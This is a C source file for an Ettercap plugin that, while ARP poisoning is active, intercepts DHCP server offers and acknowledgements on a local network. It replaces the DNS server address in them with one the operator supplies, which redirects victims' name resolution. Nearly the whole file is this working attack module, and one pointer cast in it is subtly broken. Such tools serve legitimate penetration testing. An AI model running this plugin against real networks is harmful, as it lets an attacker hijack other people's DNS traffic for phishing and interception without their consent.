/*
    dhcp_opt_poison -- overwriting DHCP options in DHCP server replies

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_hook.h>
#include <ec_proto.h>

/* protos */

int plugin_load(void *);
static int dhcp_opt_poison_init(void *);
static int dhcp_opt_poison_fini(void *);
static void dhcp_opt_poison(struct packet_object *);

/* from src/dissectors/ec_dhcp.c */
extern u_int8* get_dhcp_option(u_int8 opt, u_int8 *ptr, u_int8 *end);

/* globals */
static struct ip_addr opt_ip;
static u_int8 opt_num;

/*
 * RFC: 2131
 *
 *    0                   1                   2                   3
 *    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
 *    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *    |     op (1)    |   htype (1)   |   hlen (1)    |   hops (1)    |
 *    +---------------+---------------+---------------+---------------+
 *    |                            xid (4)                            |
 *    +-------------------------------+-------------------------------+
 
 *    |           secs (2)            |           flags (2)           |
 *    +-------------------------------+-------------------------------+
 *    |                          ciaddr  (4)                          |
 *    +---------------------------------------------------------------+
 *    |                          yiaddr  (4)                          |
 *    +---------------------------------------------------------------+
 *    |                          siaddr  (4)                          |
 *    +---------------------------------------------------------------+
 *    |                          giaddr  (4)                          |
 *    +---------------------------------------------------------------+
 *    |                          chaddr  (16)                         |
 *    +---------------------------------------------------------------+
 *    |                          sname   (64)                         |
 *    +---------------------------------------------------------------+
 *    |                          file    (128)                        |
 *    +---------------------------------------------------------------+
 *    |                       options  (variable)                     |
 *    +---------------------------------------------------------------+
 */
struct dhcp_hdr {
   u_int8   op;
      #define BOOTREQUEST  1
      #define BOOTREPLY    2
   u_int8   htype;
   u_int8   hlen;
   u_int8   hops;
   u_int32  id;
   u_int16  secs;
   u_int16  flags;
   u_int32  ciaddr;
   u_int32  yiaddr;
   u_int32  siaddr;
   u_int32  giaddr;
   u_int8   chaddr[16];
   u_int8   sname[64];
   u_int8   file[128];
   u_int32  magic;
};



/* plugin operations */

struct plugin_ops dhcp_opt_poison_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,
   /* the name of the plugin */
   .name =              "dhcp_opt_poison",
    /* a short description of the plugin (max 50 chars) */
   .info =              "Plugin to overwrite DHCP options in server replies",
   /* the plugin version. */
   .version =           "1.0",
   /* activation function */
   .init =              &dhcp_opt_poison_init,
   /* deactivation function */                     
   .fini =              &dhcp_opt_poison_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   DEBUG_MSG("dhcp_opt_poison plugin load function");
   /*
    *  in this fuction we MUST call the registration procedure that will set
    *  up the plugin according to the plugin_ops structure.
    *  the returned value MUST be the same as plugin_register()
    *  the opaque pointer params MUST be passed to plugin_register()
    */
   return plugin_register(handle, &dhcp_opt_poison_ops);
}

/*********************************************************/

static int dhcp_opt_poison_init(void *dummy) 
{
   char input[MAX_ASCII_ADDR_LEN + 5];

   DEBUG_MSG("dhcp_opt_poison_init(): - plugin initialization");

   /* variable not used - avoid extended warning */
   (void) dummy;

   /* don't run in unoffensive mode */
   if (EC_GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("dhcp_opt_poison: plugin doesn't work in unoffensive"
            " mode\n");
      return PLUGIN_FINISHED;
   }

   /* get option poisoning information from user */
   ui_input("Enter DNS Server IP: ", input, sizeof(input), NULL);

   if (!strlen(input)) {
      INSTANT_USER_MSG("dhcp_opt_poison: no IP entered\n");
      return PLUGIN_FINISHED;
   }

   // TODO NTP server option as an alternative use-case
   opt_num = DHCP_OPT_DNS;

   if (ip_addr_pton(input, &opt_ip) != E_SUCCESS) {
      INSTANT_USER_MSG("dhcp_opt_poison: entered IP is not valid\n");
      return PLUGIN_FINISHED;
   }

   if (!is_mitm_active("arp")) {
      INSTANT_USER_MSG("dhcp_opt_poison: this plugin requires ARP poisoning"
            " running\n");
   }

   /* hooking poisoner function to the DHCP server packets */
   hook_add(HOOK_PROTO_DHCP_OFFER, dhcp_opt_poison);
   hook_add(HOOK_PROTO_DHCP_ACK, dhcp_opt_poison);
   USER_MSG("dhcp_opt_poison: plugin running...\n");

   return PLUGIN_RUNNING;
}


static int dhcp_opt_poison_fini(void *dummy) 
{
   /* variable not used */
   (void) dummy;

   /* 
    * called to terminate a plugin.
    * usually to kill threads created in the 
    * init function or to remove hook added 
    * previously.
    */
   USER_MSG("dhcp_opt_poison: plugin stopped\n");

   hook_del(HOOK_PROTO_DHCP_OFFER, dhcp_opt_poison);
   hook_del(HOOK_PROTO_DHCP_ACK, dhcp_opt_poison);

   return PLUGIN_FINISHED;
}

/*
 * the actual worker function of the plugin which modifies
 * the DHCP server reply packets
 */
static void dhcp_opt_poison(struct packet_object *po)
{
   u_int8 *ptr, *end;
   u_int8 opt_len;
   struct ip_addr orig_ip, client_ip;
   struct dhcp_hdr *hdr;
   char ip_str1[MAX_ASCII_ADDR_LEN];
   char ip_str2[MAX_ASCII_ADDR_LEN];
   char ip_str3[MAX_ASCII_ADDR_LEN];
   
   /* DHCP is the L4 (UDP) payload */
   ptr = po->DATA.data;
   end = ptr + po->DATA.len;

   /* Accellerate pointer to the DHCP options */
   hdr = (struct dhcp_hdr)ptr;
   ptr += sizeof(struct dhcp_hdr);

   /* get offered client IP */
   ip_addr_init(&client_ip, AF_INET, hdr->yiaddr);

   /* if found the returned pointer points to the length byte */
   ptr = get_dhcp_option(opt_num, ptr, end);

   if (ptr == NULL) {
      DEBUG_MSG("dhcp_opt_poison: option %d not found.", opt_num);
      return;
   }

   /* get option length and advance pointer */
   opt_len = *ptr++;
   if (opt_len != opt_ip.addr_len) {
      // TODO shrink the packet if required
      INSTANT_USER_MSG("dhcp_opt_poison: multiple IPs present in option\n");
   }
   else {
      /* overwrite IP address */
      ip_addr_init(&orig_ip, AF_INET, ptr);
      ip_addr_cpy(ptr, &opt_ip);
      INSTANT_USER_MSG("dhcp_ip_poison: Replaced DNS Server IP %s with %s in "
            "DHCP response for %s\n", ip_addr_ntoa(&orig_ip, ip_str1),
            ip_addr_ntoa(&opt_ip, ip_str2), ip_addr_ntoa(&client_ip, ip_str3));
   }
   
}

/* EOF */

// vim:ts=3:expandtab


